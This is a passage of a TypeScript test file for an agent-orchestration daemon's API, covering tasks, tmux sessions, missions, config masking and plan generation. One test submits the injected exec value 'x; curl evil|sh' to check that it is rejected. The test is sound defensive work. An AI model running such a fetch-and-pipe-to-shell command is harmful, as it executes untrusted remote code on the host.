import { describe, it, expect } from 'vitest';
import { render } from '../../src/prompts/index.js';
const promptSeam = { render: (n: string, v?: Record<string, string>) => render(n, v), rawTemplate: () => '' };
import { EventEmitter } from 'node:events';
import type { ChildProcess } from 'node:child_process';
import { openDb } from '../../src/store/db.js';
import { SubagentRunnerPool } from '../../src/subagent/pool.js';
import { TaskStore } from '../../src/store/taskStore.js';
import { Readiness } from '../../src/store/readiness.js';
import { MissionStore } from '../../plugins/agents/src/store/missionStore.js';
import { EventBus } from '../../src/api/sse.js';
import type { ElowenEvent } from '../../src/api/sse.js';
import { createServer } from '../../src/api/server.js';
import { makeTestApp } from '../helpers/testApp.js';
import { FakeTmuxDriver } from '../../src/tmux/fakeDriver.js';
import { AgentStore } from '../../plugins/agents/src/store/agentStore.js';
import { SpawnService } from '../../plugins/agents/src/spawn/spawn.js';
import { MissionEngine } from '../../plugins/agents/src/overseer/missionEngine.js';
import { FakeClock } from '../../src/shared/clock.js';
import { ConfigStore } from '../../src/store/configStore.js';
import { ProjectStore } from '../../src/store/projectStore.js';
import { UserStore } from '../../src/store/userStore.js';
import { FakeInference } from '../../src/inference/client.js';

/** A body streamed in chunks with NO content-length header — the chunked shape a hard cap has to stop.
 *  `pulled()` reports how many bytes the daemon actually read, so a test can tell "rejected after
 *  buffering everything" from "rejected while reading". */
function streamedBody(totalBytes: number, chunkBytes = 16 * 1024) {
  let pulled = 0;
  const body = new ReadableStream<Uint8Array>({
    pull(controller) {
      if (pulled >= totalBytes) { controller.close(); return; }
      pulled += chunkBytes;
      controller.enqueue(new Uint8Array(chunkBytes).fill(0x78)); // 'x'
    },
  });
  return { body, pulled: () => pulled };
}

function makeApp() {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const bus = new EventBus();
  const a = createServer({ tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus, engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
  return { app: a, bus };
}

describe('api', () => {
  it('GET /health returns ok', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    expect(res.status).toBe(200);
    const body = await res.json() as { ok: boolean; version: string };
    expect(body.ok).toBe(true);
    expect(typeof body.version).toBe('string'); // surfaced for the web footer
  });
  it('GET /health reports the event loop window including the severe-stall sum', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    const body = await res.json() as { eventLoop: Record<string, unknown> };
    // severeStalledMs is the number that explains client-observed latency when `max` cannot (a request
    // queues through the SUM of stalls); windowMs says how much history the figures describe.
    for (const key of ['p50', 'p99', 'max', 'severeStalledMs', 'windowMs']) {
      expect(typeof body.eventLoop[key], key).toBe('number');
    }
  });
  // The block must be LIVE data, not shape: a constant-zero eventLoop would pass every type check while
  // telling an operator mid-incident that the loop is healthy.
  it('GET /health eventLoop reflects a genuine stall of this process', async () => {
    const { app } = makeApp();
    await new Promise((r) => setTimeout(r, 40)); // let the sampler take a baseline reading first
    const until = Date.now() + 160; while (Date.now() < until) { /* deliberately hog the loop */ }
    await new Promise((r) => setTimeout(r, 40)); // let the monitor's own timers observe the stall
    const body = await (await app.request('/health')).json() as { eventLoop: { max: number; severeStalledMs: number; windowMs: number } };
    expect(body.eventLoop.max).toBeGreaterThan(100);
    expect(body.eventLoop.severeStalledMs).toBeGreaterThanOrEqual(45);
    expect(body.eventLoop.severeStalledMs).toBeLessThanOrEqual(body.eventLoop.windowMs);
  });
  // The server-side half of the latency split: client total minus this duration is time the request
  // spent WAITING to be served (kernel backlog + event-loop queueing), which no in-process histogram
  // can attribute to a single request. Without the header, a 19.9 s /health round-trip measured during
  // a stall storm was indistinguishable from a slow handler. ONLY on /health: a per-route duration on
  // public and error responses is a small timing side-channel nothing needs.
  it('only /health carries the Server-Timing header', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    expect(res.headers.get('server-timing')).toMatch(/^app;dur=\d+(\.\d+)?$/);
    expect((await app.request('/setup')).headers.get('server-timing')).toBeNull();
    expect((await app.request('/tasks')).headers.get('server-timing')).toBeNull();
  });
  it('GET /health includes CORS header', async () => {
    const { app } = makeApp();
    const res = await app.request('/health', { headers: { origin: 'http://localhost:3000' } });
    expect(res.headers.get('access-control-allow-origin')).toBeTruthy();
  });
  it('POST /tasks creates and GET /tasks lists it', async () => {
    const { app } = makeApp();
    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-1', project_id: 1, title: 'X' }) });
    const list = await (await app.request('/tasks')).json();
    expect(list.map((t: { id: string }) => t.id)).toEqual(['elowen-1']);
  });
  it('GET /tasks?project_id=N narrows the list to one project; unknown id yields []', async () => {
    const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o'),(2,'other','/p')").run();
    const tasks = new TaskStore(db);
    const projects = new ProjectStore(db);
    const app = createServer({ tasks, projects, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(), engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 't-a', project_id: 1, title: 'A' }) });
    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 't-b', project_id: 2, title: 'B' }) });
    const all = await (await app.request('/tasks')).json() as { id: string }[];
    const p1 = await (await app.request('/tasks?project_id=1')).json() as { id: string }[];
    const p2 = await (await app.request('/tasks?project_id=2')).json() as { id: string }[];
    const p99 = await (await app.request('/tasks?project_id=99')).json() as { id: string }[];
    expect(all.map((t) => t.id).sort()).toEqual(['t-a', 't-b']);
    expect(p1.map((t) => t.id)).toEqual(['t-a']);
    expect(p2.map((t) => t.id)).toEqual(['t-b']);
    expect(p99).toEqual([]);
  });
  it('POST /tasks publishes a task SSE event', async () => {
    const { app, bus } = makeApp();
    const events: ElowenEvent[] = [];
    bus.subscribe(e => events.push(e));
    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-2', project_id: 1, title: 'Y' }) });
    expect(events).toHaveLength(1);
    expect(events[0]).toMatchObject({ type: 'task', taskId: 'elowen-2', status: 'open' });
  });
});

it('POST /tasks with body {title} generates an id and sets status open', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'From UI' }) });
  expect(res.status).toBe(201);
  const created = await res.json() as { id: string; title: string; status: string };
  expect(created.title).toBe('From UI');
  expect(created.status).toBe('open');
  expect(created.id).toBeTruthy();
  const list = await (await app.request('/tasks')).json() as Array<{ title: string }>;
  expect(list.some(t => t.title === 'From UI')).toBe(true);
});

it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
  expect(res.status).toBe(400);
  expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
  expect(await tmux.list()).toHaveLength(0);
});

it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
  expect(res.status).toBe(201);
  const body = await res.json();
  expect(body.session).toMatch(/^elowen-/);
  expect(tasks.get('elowen-1')?.status).toBe('in_progress');
  expect(await tmux.list()).toContain(body.session);
  // spawn tags the task with exec + agent labels so the UI can show its model and link the session
  const t1 = tasks.get('elowen-1')!;
  expect(t1.labels).toContain('exec:ollama-cloud/deepseek-v4-flash');
  expect(t1.labels.some((l) => l.startsWith('agent:'))).toBe(true);
});

it('POST /sessions refuses to launch into a shared checkout another agent already holds (409)', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  tasks.create({ id: 'busy', project_id: 1, title: 'Busy' });
  tasks.setStatus('busy', 'in_progress'); // a live agent already owns the project's shared checkout
  tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
  expect(res.status).toBe(409); // single-writer: don't double-occupy the checkout
  expect(tasks.get('elowen-1')?.status).toBe('open'); // not flipped
  expect(await tmux.list()).toHaveLength(0);         // nothing spawned
});

it('GET /sessions tags each live session with its project from the agent store', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (7,'elowen','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 7, title: 'X' });
  const tmux = new FakeTmuxDriver();
  const agents = new AgentStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents }), tmux, agents,
    project: { id: 7, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
  const sessions = await (await app.request('/sessions')).json();
  expect(sessions).toHaveLength(1);
  // the daemon resolves the session's repo from the agent store (works for every role, not just workers)
  expect(sessions[0].projectId).toBe(7);
});

it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
  // Served by the agents plugin's root-mounted routes: the REAL engine pauses (kills agents, reverts
  // tasks) and resumes over the shared stores.
  const { app, token, deps } = await makeTestApp();
  const { missionId } = deps.seedMissionWithChild();
  const patch = (body: object) => ({ method: 'PATCH', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });
  await app.request(`/missions/${missionId}`, patch({ action: 'pause' }));
  expect((await (await app.request('/missions', { headers: { authorization: `Bearer ${token}` } })).json())).toEqual([]); // paused → not active
  expect(deps.missions.get(missionId)?.state).toBe('paused');
  await app.request(`/missions/${missionId}`, patch({ action: 'resume' }));
  expect(deps.missions.get(missionId)?.state).toBe('active');
});

it('POST /sessions rejects an exec disallowed by config', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const config = new ConfigStore(db); config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
  expect(res.status).toBe(400);
  expect(await tmux.list()).toEqual([]);
});

it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tmux = new FakeTmuxDriver(); // no pane set for 'elowen-dead' → returns ''
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const ctrl = new AbortController();
  const res = await app.request('/sessions/elowen-dead/stream', { signal: ctrl.signal });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read();
  const text = new TextDecoder().decode(value);
  expect(text).toContain('event: pane');
  // empty pane: data contains {"pane":""}, stream must not throw
  expect(text).toContain('"pane"');
  ctrl.abort(); await reader.cancel();
});

it('GET /sessions/:name/stream emits a first pane frame', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tmux = new FakeTmuxDriver(); tmux.setPane('elowen-A', 'hello-pane');
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const ctrl = new AbortController();
  const res = await app.request('/sessions/elowen-A/stream', { signal: ctrl.signal });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read();
  const text = new TextDecoder().decode(value);
  expect(text).toContain('event: pane');
  expect(text).toContain('hello-pane');
  ctrl.abort(); await reader.cancel();
});

it('GET /events flushes an initial comment so headers reach the client immediately (no events yet)', async () => {
  // Through the web BFF proxy, a streamed response sends no HTTP headers until the first body byte.
  // The event bus is silent on a quiet system, so /events must emit an immediate SSE comment or the
  // dashboard's live channel never connects. Comments (lines starting with ':') are ignored by EventSource.
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const ctrl = new AbortController();
  const res = await app.request('/events', { signal: ctrl.signal });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read(); // resolves only if a byte is written without any publish()
  expect(new TextDecoder().decode(value).startsWith(':')).toBe(true);
  ctrl.abort(); await reader.cancel();
});

it('GET /missions/:id returns 404 for unknown mission', async () => {
  const { app, token } = await makeTestApp();
  const res = await app.request('/missions/unknown', { headers: { authorization: `Bearer ${token}` } });
  expect(res.status).toBe(404);
});

it('GET /missions/:id returns mission detail for a seeded mission', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'epic', project_id: 1, title: 'E', type: 'epic' });
  deps.missions.create({ id: 'm1', epic_id: 'epic', autonomy: 'low', max_sessions: 1 });
  const res = await app.request('/missions/m1', { headers: { authorization: `Bearer ${token}` } });
  expect(res.status).toBe(200);
  const body = await res.json() as { epic: { id: string }; progress: { total: number } };
  expect(body.epic.id).toBe('epic');
  expect(body.progress.total).toBe(0);
});

it('GET /config returns masked config; PUT updates without exposing the key', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const config = new ConfigStore(db);
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  const put = await app.request('/config', { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ allowedExecs: ['sonnet'], autopilot: { apiKey: 'sk-secret' } }) });
  expect(put.status).toBe(200);
  const get = await (await app.request('/config')).json();
  expect(get.allowedExecs).toEqual(['sonnet']);
  expect(get.autopilot.apiKeySet).toBe(true);
  expect(JSON.stringify(get)).not.toContain('sk-secret');
});

it('without a UserStore, routes are open (legacy mode)', async () => {
  const { app } = makeApp();
  expect((await app.request('/tasks')).status).toBe(200);
});

it('GET /activity returns [] without an EventStore (legacy)', async () => {
  const { app } = makeApp();
  expect(await (await app.request('/activity')).json()).toEqual([]);
});

it('PATCH /tasks/:id sets the exec label', async () => {
  const { app } = makeApp();
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-e', project_id: 1, title: 'E' }) });
  const res = await app.request('/tasks/elowen-e', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ exec: 'sonnet' }) });
  expect(res.status).toBe(200);
  expect((await res.json()).labels).toContain('exec:sonnet');
});

it('PATCH /tasks/:id updates title, type and priority', async () => {
  const { app } = makeApp();
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-u', project_id: 1, title: 'Old' }) });
  const res = await app.request('/tasks/elowen-u', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'New', type: 'bug', priority: 'P0' }) });
  expect(res.status).toBe(200);
  const t = await res.json();
  expect(t.title).toBe('New'); expect(t.type).toBe('bug'); expect(t.priority).toBe('P0');
});

it('POST /tasks sets dependencies and GET /tasks/:id/deps returns them; PATCH replaces them', async () => {
  const { app } = makeApp();
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'dep-a', project_id: 1, title: 'A' }) });
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'dep-b', project_id: 1, title: 'B' }) });
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'dep-c', project_id: 1, title: 'C', deps: ['dep-a', 'dep-b'] }) });
  const deps = await (await app.request('/tasks/dep-c/deps')).json();
  expect(deps.sort()).toEqual(['dep-a', 'dep-b']);
  await app.request('/tasks/dep-c', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ deps: ['dep-a'] }) });
  expect(await (await app.request('/tasks/dep-c/deps')).json()).toEqual(['dep-a']);
  const all = await (await app.request('/tasks/deps')).json() as { task_id: string; depends_on_id: string }[];
  expect(all).toContainEqual({ task_id: 'dep-c', depends_on_id: 'dep-a' });
});

it('POST /tasks persists a description and PATCH updates it', async () => {
  const { app } = makeApp();
  const post = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'X', description: 'do the thing' }) });
  const created = await post.json() as { id: string; description: string };
  expect(created.description).toBe('do the thing');
  const patch = await app.request(`/tasks/${created.id}`, { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ description: 'changed' }) });
  expect((await patch.json()).description).toBe('changed');
});

it('DELETE /tasks/:id removes the task and publishes a cancelled event', async () => {
  const { app, bus } = makeApp();
  const events: ElowenEvent[] = []; bus.subscribe(e => events.push(e));
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-d', project_id: 1, title: 'Doomed' }) });
  const res = await app.request('/tasks/elowen-d', { method: 'DELETE' });
  expect(res.status).toBe(200);
  const list = await (await app.request('/tasks')).json() as Array<{ id: string }>;
  expect(list.some(t => t.id === 'elowen-d')).toBe(false);
  expect(events.some(e => e.type === 'task' && e.taskId === 'elowen-d' && e.status === 'cancelled')).toBe(true);
});

it('POST /tasks honours an explicit project_id (multi-project)', async () => {
  const db = openDb(':memory:');
  db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  db.prepare("INSERT INTO projects (id,slug,path) VALUES (2,'other','/p2')").run();
  const tasks = new TaskStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
    config: new ConfigStore(db), projects: new ProjectStore(db),
  });
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'X', project_id: 2 }) });
  expect(res.status).toBe(201);
  const created = await res.json() as { id: string; project_id: number };
  expect(created.project_id).toBe(2);
  expect(created.id.startsWith('p2-')).toBe(true); // id prefix derives from project 2's path basename
});

it('POST /tasks rejects an unknown project_id with 404', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
    config: new ConfigStore(db), projects: new ProjectStore(db),
  });
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'X', project_id: 99 }) });
  expect(res.status).toBe(404);
});

it('POST /tasks/plan without an autopilot key returns 400', async () => {
  const { app } = makeApp(); // no apiKey configured
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'do stuff' }) });
  expect(res.status).toBe(400);
  expect(await res.json()).toMatchObject({ error: 'autopilot_key_missing' });
});

it('POST /tasks/plan decomposes a goal into an epic with sequential phase subtasks', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"Schema","type":"task"},{"title":"API","type":"feature"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'build app' }) });
  expect(res.status).toBe(202); // autopilot is now an async plan job (relay resolves it inline)
  const { jobId, epicId } = await res.json() as { jobId: string; epicId: string };
  const job = await (await app.request(`/plan/${jobId}`)).json() as { status: string };
  expect(job.status).toBe('done');
  const epic = tasks.get(epicId)!;
  expect(epic.type).toBe('epic');
  expect(epic.title).toBe('build app');
  const phases = tasks.descendants(epicId);
  expect(phases.map(p => p.title)).toEqual(['Schema', 'API']);
  expect(phases.every(p => p.parent_id === epicId)).toBe(true);
  // phase 2 depends on phase 1
  expect(tasks.depsAmong(phases.map(p => p.id))).toEqual([{ task_id: phases[1].id, depends_on_id: phases[0].id }]);
});

it('POST /tasks/plan stores the model-assigned agent name as a label', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"Schema","type":"task","agent":"Nova"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'build app' }) });
  const { epicId } = await res.json() as { epicId: string };
  expect(tasks.descendants(epicId)[0].labels).toContain('agent:Nova');
});

it('POST /tasks/plan with supplied phases skips the LLM and needs no key', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
    makeInference: () => { throw new Error('LLM must not be called in manual mode'); },
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'manual goal', phases: [{ title: 'One', type: 'feature' }, { title: 'Two' }] }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { epic: { title: string }; phases: { title: string; type: string }[] };
  expect(body.epic.title).toBe('manual goal');
  expect(body.phases.map(p => [p.title, p.type])).toEqual([['One', 'feature'], ['Two', 'task']]);
});

it('POST /tasks/plan dryRun returns phases without creating any tasks', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"A","type":"task"},{"title":"B"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'preview me', dryRun: true, prompt: 'custom {{goal}}' }) });
  expect(res.status).toBe(202);
  const { jobId } = await res.json() as { jobId: string };
  const job = await (await app.request(`/plan/${jobId}`)).json() as { status: string; phases: { title: string }[] };
  expect(job.status).toBe('done');
  expect(job.phases.map(p => p.title)).toEqual(['A', 'B']);
  expect(await (await app.request('/tasks')).json()).toEqual([]); // nothing persisted
});

it('POST /tasks/plan with engage=true engages a mission on the epic', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  let engagedEpic = '';
  const engine = { engage: async (input: { epicId: string }) => { engagedEpic = input.epicId; return { id: 'm-x', epic_id: input.epicId, autonomy: 'L3', max_sessions: 1, state: 'active' }; } } as unknown as MissionEngine;
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"Only phase"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'ship it', engage: true }) });
  expect(res.status).toBe(202);
  const { epicId } = await res.json() as { epicId: string };
  // The relay path finalizes (and engages) inline before responding, so the mission is engaged now.
  expect(engagedEpic).toBe(epicId);
});

it('POST /tasks/:epicId/phases inserts a phase chained after the epic\'s current tail', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  // Build an epic with two sequential phases (manual mode — no key needed).
